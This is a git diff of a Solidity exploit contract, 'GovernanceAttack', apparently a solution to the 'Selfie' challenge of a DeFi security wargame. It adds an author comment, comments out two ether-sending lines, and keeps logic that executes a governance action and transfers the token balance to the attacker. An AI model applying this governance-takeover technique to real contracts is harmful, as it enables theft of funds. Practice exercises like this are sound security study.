@@ -94,7 +94,10 @@ contract SimpleGovernance {
 }
 
 
-
+/**
+ @title Governance Attack
+ @author Janio Silva
+*/
 contract GovernanceAttack {
     SimpleGovernance public governanceContract;
     SelfiePool public victimPool;
@@ -124,11 +127,11 @@ contract GovernanceAttack {
     }
     function attackExecute() public {
 	address payable _govAddr = payable(address(governanceContract));
-	_govAddr.call{value: 1 ether}("");	
+	//_govAddr.call{value: 1 ether}("");	
         console.log("balance of the ATTACKER: %s", address(this).balance);
 	//this.sendTransaction{to: _govAddr, value: 500 gwei}("");
 	//_govAddr.transfer(500 gwei);
-	sendEtherByForce.attackSendEther(_govAddr);
+	//sendEtherByForce.attackSendEther(_govAddr);
 	console.log("balance of Simple Governance: %s", _govAddr.balance);
         governanceContract.executeAction(actionId);
 	tokenDVT.transfer(attackerAddress,tokenDVT.balanceOf(address(this)));
